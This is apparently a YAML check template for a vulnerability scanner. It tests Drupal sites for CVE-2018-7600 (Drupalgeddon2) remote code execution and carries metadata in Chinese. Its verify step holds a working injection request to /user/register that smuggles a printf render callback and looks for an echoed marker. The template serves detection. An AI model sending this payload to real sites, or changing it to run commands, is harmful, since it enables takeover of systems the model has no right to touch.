app: Drupal
query: body:"drupal"
meta:
  name: Drupal CVE-2018-7600 RCE
  level: 4
  tags:
    - remote_code_execution
  description: 攻击者可以利用该漏洞执行恶意代码，导致网站完全被控制。
  homepage: https://www.drupal.org/
  author: 一曲成殇
  references: https://paper.seebug.org/567/
  solution: 升级系统版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
            redirect: false
            header:
              - Content-Type: application/x-www-form-urlencoded
            params: ' form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=echo
            he151xx515x4'
          response:
            - name: body
              value: he151xx515x4
              type: contains
  create_at: "2021-11-09 21:49:04"
